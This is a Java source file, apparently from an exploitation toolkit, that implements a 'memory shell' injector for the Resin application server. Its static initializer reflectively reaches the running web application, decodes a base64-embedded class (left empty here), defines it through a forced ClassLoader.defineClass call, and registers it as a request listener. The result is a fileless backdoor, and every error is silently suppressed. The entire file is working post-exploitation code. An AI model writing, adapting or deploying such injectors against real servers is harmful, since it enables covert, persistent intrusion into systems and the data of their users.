package core.memshell;

import javax.servlet.ServletRequestListener;
import java.lang.reflect.Method;

public class ResinListenerMemShell {
    static {
        Inject();
    }

    public ResinListenerMemShell() {
        Inject();
    }


    public static synchronized void Inject() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");

            Object contextRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
            String ListenerBase64 = "";
            byte[] ListenerClass = base64Decode(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            ServletRequestListener listenerObject = (ServletRequestListener) listenerClass.newInstance();

            // 4.X ListenerConfig | 3.X Listener
            Class ListenerConfigCls = null;
            try {
                ListenerConfigCls = classLoader.loadClass("com.caucho.server.webapp.ListenerConfig");
            } catch (Exception e) {
                ListenerConfigCls = classLoader.loadClass("com.caucho.server.webapp.Listener");
            }
            Object ListenerConfig = ListenerConfigCls.newInstance();

            Method m1 = ListenerConfig.getClass().getDeclaredMethod("setListenerClass", Class.class);
            m1.setAccessible(true);
            m1.invoke(ListenerConfig, listenerClass);

            // // 4.X getClass() ListenerConfig  | 3.X getClass().getSuperClass*() Listener
            Method m2 = null;
            try {
                m2 = webapp.getClass().getDeclaredMethod("addListener", ListenerConfig.getClass());
            } catch (Exception e) {
                m2 = webapp.getClass().getSuperclass().getDeclaredMethod("addListener", ListenerConfig.getClass());
            }
            m2.setAccessible(true);
            m2.invoke(webapp, ListenerConfig);

        } catch (Exception e) {
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

}
